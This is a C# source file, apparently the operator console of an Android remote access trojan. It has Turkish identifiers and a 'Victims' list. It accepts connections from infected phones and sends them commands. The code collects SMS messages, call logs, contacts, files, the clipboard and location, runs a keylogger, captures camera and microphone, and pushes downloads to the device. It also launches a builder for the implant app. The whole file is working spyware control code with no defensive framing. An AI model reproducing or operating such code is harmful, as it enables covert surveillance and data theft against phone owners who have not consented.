using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Views
{
    public partial class MainWindow : Form
    {
        List<Victims> kurban_listesi = new List<Victims>();
        Socket soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        public MainWindow()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            if (new Port().ShowDialog() == DialogResult.OK)
            {
                Dinle();
            }
            else
            {
                Environment.Exit(0);
            }
        }
        public static int port_no = 9999;
        public void Dinle()
        {
            try
            {
                soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                //soketimiz.NoDelay = true;
                soketimiz.SendBufferSize = 524288; soketimiz.ReceiveBufferSize = 524288;
                soketimiz.SendTimeout = -1; soketimiz.ReceiveTimeout = -1;
                soketimiz.Bind(new IPEndPoint(IPAddress.Any, port_no));
                toolStripStatusLabel1.Text = "Port: " + port_no.ToString();
                soketimiz.Listen(int.MaxValue);
                soketimiz.BeginAccept(new AsyncCallback(Client_Kabul), null);
            }
            catch (Exception) { }
        }
        public async void infoAl(Socket sckInf)
        {
            if (!sckInf.Connected)
            {
                listBox1.Items.Add(sckInf.Handle.ToString() +
                " didn't connect."); return;
            }
            if (sckInf.Poll(-1, SelectMode.SelectRead) && sckInf.Available <= 0)
            {
                listBox1.Items.Add(sckInf.Handle.ToString() +
                " ghost connection: Poll");
                sckInf.Disconnect(false);
                sckInf.Close();
                sckInf.Dispose();
                return;
            }
            if (sckInf.Available == 0)
            {
                listBox1.Items.Add(sckInf.Handle.ToString() +
                " the socket is not ready: [ghost connection]");
                sckInf.Disconnect(false);
                sckInf.Close();
                sckInf.Dispose();
                return;
            }
            NetworkStream networkStream = new NetworkStream(sckInf);

            if (!networkStream.CanRead)
            {
                listBox1.Items.Add(sckInf.Handle.ToString() +
                    " kimlik numaralı soket için ağ akışı okunamadı."); return;
            }

            listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + sckInf.Handle.ToString() +
                    " kimlik numaralı soket için ağ akışı başladı.");

            StringBuilder sb = new StringBuilder();
            int thisRead = 0;
            int blockSize = 2048;
            byte[] dataByte = new byte[blockSize];
            while (true)
            {
                try
                {
                    thisRead = await networkStream.ReadAsync(dataByte, 0, blockSize);
                    sb.Append(Encoding.UTF8.GetString(dataByte, 0, thisRead));
                    while (sb.ToString().Trim().Contains("<EOF>"))
                    {
                        string veri = sb.ToString().Substring(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf("<EOF>") + 5);
                        sb.Remove(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf("<EOF>") + 5);
                        DataInvoke(sckInf, veri.Replace("<EOF>", ""));
                    }
                }
                catch (Exception ex)
                {
                    if (ex.InnerException.ToString().Contains("Sockets"))
                    {
                        break;
                    }
                }
            }
        }
        public static async void GoToOurSocket(string tag, string mesaj, Socket client)
        {
            try
            {
                using (NetworkStream ns = new NetworkStream(client))
                {
                    byte[] cmd = Encoding.UTF8.GetBytes("[0x09]" + tag + mesaj + "<EOF>");
                    await ns.WriteAsync(cmd, 0, cmd.Length);
                }
            }
            catch (Exception) { }
        }
        public void Client_Kabul(IAsyncResult ar)
        {
            try
            {
                Socket sock = soketimiz.EndAccept(ar);
                infoAl(sock);
                soketimiz.BeginAccept(new AsyncCallback(Client_Kabul), null);
            }
            catch (Exception) { }
        }
        public static int topOf = 0;
        public async void Ekle(Socket socettte, string idimiz, string makine_ismi,
            string ulke_dil, string uretici_model, string android_ver)
        {
            //socettte.NoDelay = true;
            //socettte.ReceiveBufferSize = int.MaxValue; socettte.SendBufferSize = int.MaxValue;
            kurban_listesi.Add(new Victims(socettte, idimiz));
            ListViewItem lvi = new ListViewItem(idimiz);
            lvi.SubItems.Add(makine_ismi);
            lvi.SubItems.Add(socettte.RemoteEndPoint.ToString());
            lvi.SubItems.Add(ulke_dil);
            lvi.SubItems.Add(uretici_model.ToUpper());
            lvi.SubItems.Add(android_ver);

            if (File.Exists(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\" + ulke_dil.Split('/')[1] + ".png"))
            {
                lvi.ImageKey = ulke_dil.Split('/')[1] + ".png";
            }
            else
            {
                lvi.ImageIndex = 0;
            }
            listView1.Items.Add(lvi);
            if (File.Exists(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\" + ulke_dil.Split('/')[1] + ".png"))
            {
                new Notification(makine_ismi, uretici_model, android_ver,
                Image.FromFile(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\" + ulke_dil.Split('/')[1] + ".png")).Show();
            }
            else
            {
                new Notification(makine_ismi, uretici_model, android_ver, Image.FromFile(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\-1.png")).Show();
            }
            toolStripStatusLabel2.Text = "Online: " + listView1.Items.Count.ToString();
            listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + socettte.Handle.ToString() +
                        " kimlik numaralı soket listede. => " + makine_ismi + "/" + socettte.RemoteEndPoint.ToString());
            await Task.Delay(1);
            topOf += 125;

        }
        public static RotateFlipType rotateFlip = RotateFlipType.Rotate270FlipX;
        public Image RotateImage(Image img)
        {
            Bitmap bmp = new Bitmap(img);
            using (Graphics gfx = Graphics.FromImage(bmp))
            {
                gfx.Clear(Color.White);
                gfx.DrawImage(img, 0, 0, img.Width, img.Height);
            }

            bmp.RotateFlip(rotateFlip);
            return bmp;
        }
        public void DataInvoke(Socket soket2, string data)
        {
            string[] ayir = data.Split(new[] { "[0x09]" }, StringSplitOptions.None);
            foreach (string str in ayir)
            {
                string[] s = str.Split(new[] { "[VERI]" }, StringSplitOptions.None);
                try
                {
                    switch (s[0])
                    {
                        case "IP":
                            Invoke((MethodInvoker)delegate
                            {
                                Ekle(soket2, soket2.Handle.ToString(), s[1], s[2], s[3], s[4]);
                            });
                            break;
                        case "CAMREADY":
                            if (FİndKameraById(soket2.Handle.ToString()) != null)
                            {
                                var _shortcam_ = FİndKameraById(soket2.Handle.ToString());
                                _shortcam_.button4.Text = "Start"; _shortcam_.button4.Enabled = true;
                                ((Control)_shortcam_.tabControl1.TabPages[0]).Enabled = true;
                                _shortcam_.enabled = false; _shortcam_.label10.Text = "Fps: 0";
                            }
                            break;
                        case "VID":
                            try
                            {
                                var shortcam = FİndKameraById(soket2.Handle.ToString());
                                if (shortcam != null)
                                {
                                    shortcam.pictureBox2.Image = RotateImage((Image)new ImageConverter().ConvertFrom(Convert.FromBase64String(s[1])));
                                    shortcam.label10.Text = "Fps: " + shortcam.CalculateFrameRate().ToString();
                                }
                            }
                            catch (Exception ex) { FİndKameraById(soket2.Handle.ToString()).Text = ex.Message; }
                            break;
                        case "SHORTCUT":
                            Entertainment eglnc = FindEglenceById(soket2.Handle.ToString());
                            if (eglnc == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    eglnc = new Entertainment(soket2, soket2.Handle.ToString());
                                    eglnc.Show();
                                });
                            }
                            MessageBox.Show(eglnc, s[1], "Sonuç", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            break;
                        case "OLCULER":
                            Invoke((MethodInvoker)delegate
                            {
                                if (s[1].Contains("Kameraya"))
                                {
                                    MessageBox.Show(this, s[1] + "\nThis error causes when camera is used by victim.", "Can't access to Camera", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                                }
                                else
                                {
                                    if (FİndKameraById(soket2.Handle.ToString()) == null)
                                    {
                                        Camera msj = new Camera(soket2, soket2.Handle.ToString());
                                        msj.Show();
                                    }
                                    FİndKameraById(soket2.Handle.ToString()).comboBox1.Items.Clear();
                                    FİndKameraById(soket2.Handle.ToString()).comboBox2.Items.Clear();
                                    string[] front = s[1].Split('>');
                                    string[] _split = front[1].Split('<');
                                    FİndKameraById(soket2.Handle.ToString()).max = int.Parse(s[2].Split('}')[1]);
                                    FİndKameraById(soket2.Handle.ToString()).comboBox1.Items.AddRange(_split);
                                    _split = front[0].Split('<');
                                    FİndKameraById(soket2.Handle.ToString()).comboBox2.Items.AddRange(_split);
                                    var found = FİndKameraById(soket2.Handle.ToString());
                                    found.zoomSupport = Convert.ToBoolean(s[2].Split('}')[0]);

                                    string[] presize = s[3].Split('<'); found.comboBox4.Items.AddRange(presize);
                                    string[] cams = s[4].Split('!'); for (int p = 0; p < cams.Length; p++)
                                    {
                                        cams[p] = cams[p].Replace("0", "Back: 0").Replace("1", "Front: 1");
                                    }
                                    found.comboBox6.Items.AddRange(cams);
                                    found.comboBox6.SelectedIndex = 0;
                                    foreach (string str_ in found.comboBox1.Items)
                                    {
                                        if (int.Parse(str_.Split('x')[0]) < 800 && int.Parse(str_.Split('x')[0]) > 500)
                                        {
                                            found.comboBox1.SelectedItem = str_; break;
                                        }
                                    }
                                    foreach (string str_ in found.comboBox2.Items)
                                    {
                                        if (int.Parse(str_.Split('x')[0]) < 800 && int.Parse(str_.Split('x')[0]) > 500)
                                        {
                                            found.comboBox2.SelectedItem = str_; break;
                                        }
                                    }
                                    foreach (object str_ in found.comboBox4.Items)
                                    {
                                        if (str_.ToString().Contains("352"))
                                        {
                                            found.comboBox4.SelectedItem = str_;
                                        }
                                    }
                                    found.comboBox3.SelectedItem = "%70";
                                }
                            });
                            break;
                        case "CAMNOT":
                            var fnd = FİndKameraById(soket2.Handle.ToString());
                            if (fnd != null)
                            {
                                FİndKameraById(soket2.Handle.ToString()).label2.Text = "Çekilemedi.";
                                FİndKameraById(soket2.Handle.ToString()).label1.Visible = true;
                                FİndKameraById(soket2.Handle.ToString()).button1.Enabled = true;
                                ((Control)fnd.tabPage1).Enabled = true;
                                ((Control)fnd.tabPage2).Enabled = true;
                                fnd.enabled = false;
                                fnd.button4.Text = "Start";
                                fnd.button4.Enabled = true;
                            }
                            break;
                        case "SMSLOGU":
                            if (FindSMSFormById(soket2.Handle.ToString()) == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    SMSYoneticisi sMS = new SMSYoneticisi(soket2, soket2.Handle.ToString());
                                    sMS.Show();
                                });
                            }
                            FindSMSFormById(soket2.Handle.ToString()).bilgileriIsle(s[1]);
                            break;
                        case "CAGRIKAYITLARI":
                            if (FindCagriById(soket2.Handle.ToString()) == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    CallLogs sMS = new CallLogs(soket2, soket2.Handle.ToString());
                                    sMS.Show();
                                });
                            }
                            FindCagriById(soket2.Handle.ToString()).bilgileriIsle(s[1]);
                            break;
                        case "REHBER":
                            if (FindRehberById(soket2.Handle.ToString()) == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    AddressBook sMS = new AddressBook(soket2, soket2.Handle.ToString());
                                    sMS.Show();
                                });
                            }
                            FindRehberById(soket2.Handle.ToString()).FetchContacts(s[1]);
                            break;
                        case "APPS":
                            if (FindUygulamalarById(soket2.Handle.ToString()) == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    InstalledApps eglence = new InstalledApps(soket2, soket2.Handle.ToString());
                                    eglence.Show();
                                });
                            }
                            FindUygulamalarById(soket2.Handle.ToString()).bilgileriIsle(s[1]);
                            break;
                        case "DOSYAALINDI":
                            FindFileManagerById(soket2.Handle.ToString()).timer1.Enabled = false; FindFileManagerById(soket2.Handle.ToString()).count = 0;
                            FindFileManagerById(soket2.Handle.ToString()).Text = "Dosya Yöneticisi";
                            MessageBox.Show(FindFileManagerById(soket2.Handle.ToString()), "İsimli kurbanınızda dosya başarılı bir şekilde kaydedildi.", s[1], MessageBoxButtons.OK, MessageBoxIcon.Information);
                            break;
                        case "WEBCAM":
                            if (FİndKameraById(soket2.Handle.ToString()) == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    Camera msj = new Camera(soket2, soket2.Handle.ToString());
                                    msj.Show();
                                });
                            }
                            try
                            {

                                FİndKameraById(soket2.Handle.ToString()).label2.Text = "Çekildi.";
                                byte[] resim = Convert.FromBase64String(s[1]);
                                using (MemoryStream ms = new MemoryStream(resim))
                                {
                                    FİndKameraById(soket2.Handle.ToString()).pictureBox1.Image = Image.FromStream(ms);
                                }
                                FİndKameraById(soket2.Handle.ToString()).button1.Enabled = true;
                                ((Control)FİndKameraById(soket2.Handle.ToString()).tabPage2).Enabled = true;
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show(FİndKameraById(soket2.Handle.ToString()), ex.Message);
                                FİndKameraById(soket2.Handle.ToString()).Text = "Kamera " + ex.Message;
                            }
                            break;
                        case "FILES":
                            if (FindFileManagerById(soket2.Handle.ToString()) == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    fmanger = new FİleManager(soket2, soket2.Handle.ToString());
                                    fmanger.Show();
                                });
                            }
                            FindFileManagerById(soket2.Handle.ToString()).bilgileriIsle(s[1], s[2]);
                            break;
                        case "PREVIEW":
                            if (FindFileManagerById(soket2.Handle.ToString()) == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    fmanger = new FİleManager(soket2, soket2.Handle.ToString());
                                    fmanger.Show();
                                });
                            }
                            Invoke((MethodInvoker)delegate
                            {
                                FindFileManagerById(soket2.Handle.ToString()).pictureBox1.Image =
                                   (Image)new ImageConverter().ConvertFrom(Convert.FromBase64String(s[1]));
                                FindFileManagerById(soket2.Handle.ToString()).pictureBox1.Visible = true;
                            });
                            break;
                        case "UZUNLUK":
                            string dosyaAdi = s[2];
                            if (!Directory.Exists(Environment.CurrentDirectory + "\\Klasörler\\İndirilenler\\" + s[3]))
                            {
                                Directory.CreateDirectory(Environment.CurrentDirectory + "\\Klasörler\\İndirilenler\\" + s[3]);
                            }
                            try
                            {
                                File.WriteAllBytes(Environment.CurrentDirectory + "\\Klasörler\\İndirilenler\\" + s[3] + "\\"
                                    + s[2], Convert.FromBase64String(s[1]));
                            }
                            catch (Exception ex) { MessageBox.Show(ex.Message); }
                            FindFileManagerById(soket2.Handle.ToString()).timer1.Enabled = false; FindFileManagerById(soket2.Handle.ToString()).count = 0;
                            FindFileManagerById(soket2.Handle.ToString()).Text = "Dosya Yöneticisi";
                            MessageBox.Show(FindFileManagerById(soket2.Handle.ToString()), "Dosya indi", "İndirme Tamamlandı", MessageBoxButtons.OK,
                                MessageBoxIcon.Information);
                            break;
                        case "CHAR":
                            try
                            {
                                FindKeyloggerManagerById(soket2.Handle.ToString()).textBox1.Text += s[1].Replace("[NEW_LINE]", Environment.NewLine)
                            + Environment.NewLine;
                            }
                            catch (Exception) { }
                            break;
                        case "LOGDOSYA":
                            try
                            {
                                if (FindKeyloggerManagerById(soket2.Handle.ToString()) == null)
                                {
                                    Invoke((MethodInvoker)delegate
                                    {
                                        Keylogger keylog = new Keylogger(soket2, soket2.Handle.ToString());
                                        keylog.Show();
                                    });
                                }
                                if (s[1] == "LOG_YOK")
                                {
                                    FindKeyloggerManagerById(soket2.Handle.ToString()).comboBox1.Items.Add("Log yok.");
                                }
                                else
                                {
                                    string ok = s[1];
                                    string[] ayristir = ok.Split('=');
                                    for (int i = 0; i < ayristir.Length; i++)
                                    {
                                        FindKeyloggerManagerById(soket2.Handle.ToString()).comboBox1.Items.Add(ayristir[i]);
                                    }
                                }
                            }
                            catch (Exception) { }
                            break;
                        case "KEYGONDER":
                            string ok_ = s[1];
                            FindKeyloggerManagerById(soket2.Handle.ToString()).textBox2.Text = ok_.Replace("[NEW_LINE]", Environment.NewLine);
                            break;
                        case "SESBILGILERI":
                            if (FindAyarlarById(soket2.Handle.ToString()) == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    Settings sMS = new Settings(soket2, soket2.Handle.ToString());
                                    sMS.Show();
                                });
                            }
                            FindAyarlarById(soket2.Handle.ToString()).bilgileriIsle(s[1]);
                            break;
                        case "TELEFONBILGI":
                            if (FindBilgiById(soket2.Handle.ToString()) == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    Infos eglence = new Infos(soket2, soket2.Handle.ToString());
                                    eglence.Show();
                                });
                            }
                            var shorted = FindBilgiById(soket2.Handle.ToString());
                            shorted.bilgileriIsle(s[1], s[2], s[3], s[6], s[5], s[7], s[8]);
                            break;
                        case "PANOGELDI":
                            try
                            {
                                if (FindTelephonFormById(soket2.Handle.ToString()) == null)
                                {
                                    Invoke((MethodInvoker)delegate
                                    {
                                        Telefon tlf = new Telefon(soket2, soket2.Handle.ToString());
                                        tlf.Show();
                                    });
                                }
                                string icerik = s[1];
                                if (icerik != "[NULL]")
                                {
                                    FindTelephonFormById(soket2.Handle.ToString()).textBox4.Text = icerik;
                                }
                                else
                                {
                                    FindTelephonFormById(soket2.Handle.ToString()).textBox4.Text = string.Empty;
                                }
                            }
                            catch (Exception) { }
                            break;
                        case "WALLPAPERBYTES":
                            try
                            {
                                if (FindTelephonFormById(soket2.Handle.ToString()) == null)
                                {
                                    Invoke((MethodInvoker)delegate
                                    {
                                        Telefon tlf = new Telefon(soket2, soket2.Handle.ToString());
                                        tlf.Show();
                                    });
                                }
                                FindTelephonFormById(soket2.Handle.ToString()).label4.Text = "Ekran Çözünürlüğü\n" + s[2];
                                FindTelephonFormById(soket2.Handle.ToString()).pictureBox1.Image
                               = (Image)new ImageConverter().ConvertFrom(Convert.FromBase64String(s[1]));
                            }
                            catch (Exception) { }
                            break;
                        case "LOCATION":
                            if (FindKonumById(soket2.Handle.ToString()) == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    Location knm = new Location(soket2, soket2.Handle.ToString());
                                    knm.Show();
                                });
                            }
                            FindKonumById(soket2.Handle.ToString()).richTextBox1.Text = string.Empty;
                            string[] ayr = s[1].Split('=');
                            for (int i = 0; i < ayr.Length; i++)
                            {
                                if (ayr[i].Contains("{"))
                                {
                                    string[] url = ayr[i].Split('{');
                                    ayr[i] = $"http://maps.google.com/maps?q={url[0].Replace(','.ToString(), '.'.ToString())},{url[1].Replace(','.ToString(), '.'.ToString())}";
                                }
                                FindKonumById(soket2.Handle.ToString()).richTextBox1.Text += ayr[i] + Environment.NewLine;
                            }
                            break;
                        case "ARAMA":
                            try
                            {
                                ListViewItem lvi = listView1.Items.Cast<ListViewItem>().Where(items => items.Text ==
                                soket2.Handle.ToString()).First();
                                Invoke((MethodInvoker)delegate
                                {
                                    new YeniArama(s[1].Split('=')[1], s[1].Split('=')[0], lvi.SubItems[1].Text + "@" + soket2.RemoteEndPoint.ToString(), soket2.Handle.ToString()).Show();
                                });
                            }
                            catch (Exception) { }
                            break;
                        case "INDIRILDI":
                            try
                            {
                                var window = FindDownloadManagerById(soket2.Handle.ToString());
                                MessageBox.Show(window, s[1], "Dosyanızın İndirtme Sonucu", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }
                            catch (Exception) { }
                            break;
                        case "RECSMS":
                            Invoke((MethodInvoker)delegate
                            {
                                smsgeldi smsgeldi = new smsgeldi(s[1] + "/" + s[2], s[3], s[4]);
                                smsgeldi.Show();
                            });
                            break;
                    }
                }
                catch (Exception) { }
            }
        }
        FİleManager fmanger;
        private void mesajYollaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Victims kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    GoToOurSocket("CAMHAZIRLA", "[VERI][0x09]", kurban.socket);
                    /*
                    Kamera msj = new Kamera(kurban.soket, kurban.id);
                    msj.Show();
                    */
                }
            }
        }
        private void bağlantıyıKapatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Victims kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        GoToOurSocket("DOSYA", "[VERI][0x09]", kurban.socket);
                    }
                }
            }
        }
        private void masaustuİzleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Victims kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Telefon tlf = new Telefon(kurban.socket, kurban.id);
                        tlf.Show();
                    }
                }
            }
        }
        private void canlıMikrofonToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Victims kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Microphone masaustu = new Microphone(kurban.socket);
                        masaustu.Show();
                    }
                }
            }
        }
        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Victims kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        GoToOurSocket("LOGLARIHAZIRLA", "[VERI][0x09]", kurban.socket);
                    }
                }
            }
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }
        public int FindAramaCount(string ident)
        {
            var list = Application.OpenForms
          .OfType<YeniArama>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.Count();
        }
        public Telefon FindTelephonFormById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Telefon>()
              .Where(form => string.Equals(form.uniq_id, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public AddressBook FindRehberById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<AddressBook>()
              .Where(form => string.Equals(form.Id, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public SMSYoneticisi FindSMSFormById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<SMSYoneticisi>()
              .Where(form => string.Equals(form.uniq_id, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public FİleManager FindFileManagerById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<FİleManager>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Keylogger FindKeyloggerManagerById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Keylogger>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Camera FİndKameraById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Camera>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public CallLogs FindCagriById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<CallLogs>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Settings FindAyarlarById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Settings>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public InstalledApps FindUygulamalarById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<InstalledApps>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Infos FindBilgiById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Infos>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Location FindKonumById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Location>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Entertainment FindEglenceById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Entertainment>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public DownloadManager FindDownloadManagerById(string ident)
        {
            var list = Application.OpenForms
          .OfType<DownloadManager>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        private void sMSYöneticisiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Victims kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        GoToOurSocket("GELENKUTUSU", "[VERI][0x09]", kurban.socket);
                    }
                }
            }
        }
        private void çağrıKayıtlarıToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Victims kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        GoToOurSocket("CALLLOGS", "[VERI][0x09]", kurban.socket);
                    }
                }
            }
        }

        private void telefonAyarlarıToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Victims kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        GoToOurSocket("VOLUMELEVELS", "[VERI][0x09]", kurban.socket);
                    }
                }
            }
        }

        private void rehberToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Victims kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        GoToOurSocket("REHBERIVER", "[VERI][0x09]", kurban.socket);
                    }
                }
            }
        }

        private void eğlencePaneliToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Victims kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Entertainment eglence = new Entertainment(kurban.socket, kurban.id);
                        eglence.Show();
                    }
                }
            }
        }
        private void uygulamaListesiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Victims kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        GoToOurSocket("APPLICATIONS", "[VERI][0x09]", kurban.socket);
                    }
                }
            }
        }

        private void telefonDurumuToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Victims kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        GoToOurSocket("SARJ", "[VERI][0x09]", kurban.socket);
                    }
                }
            }
        }
        private void oluşturToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new AndroidAppBuilder().Show();
        }

        private void hakkındaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new About().Show();
        }

        private void konumToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Victims kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    GoToOurSocket("KONUM", "[VERI][0x09]", kurban.socket);
                }
            }
        }

        private void ayarlarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new VictimSettings().Show();
        }

        private void dosyaİndirtToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Victims kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    DownloadManager dwn = new DownloadManager(kurban.socket, kurban.id);
                    dwn.Show();
                }
            }
        }
        private void bağlantıAyarlarıToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Victims kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    new Connection(kurban.socket, kurban.id).Show();
                }
            }
        }

        private void loglarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            panel1.Visible = !panel1.Visible;
            if (panel1.Visible) { loglarToolStripMenuItem.Text = "Victims"; }
            else { loglarToolStripMenuItem.Text = "Logs"; }
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            foreach (Victims krbn in kurban_listesi.ToList())
            {
                try
                {
                    byte[] kntrl = Encoding.UTF8.GetBytes("[0x09]KNT[VERI][0x09]<EOF>");
                    krbn.socket.Send(kntrl, 0, kntrl.Length, SocketFlags.None);
                }
                catch (Exception)
                {
                    var victim = listView1.Items.Cast<ListViewItem>().Where(y => y.Text == krbn.socket.Handle.ToString()).First();
                    listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + krbn.socket.Handle.ToString() + " kimlik numaralı soket'in bağlantısı kesildi. => " + victim.SubItems[1].Text + "/" + victim.SubItems[2].Text);
                    victim.Remove();
                    kurban_listesi.Where(x => x.id == krbn.socket.Handle.ToString()).First().socket.Close();
                    kurban_listesi.Where(x => x.id == krbn.socket.Handle.ToString()).First().socket.Dispose();
                    kurban_listesi.Remove(kurban_listesi.Where(x => x.id == krbn.socket.Handle.ToString()).First());
                    toolStripStatusLabel2.Text = "Online: " + listView1.SelectedItems.Count.ToString();
                }
            }
        }
    }
}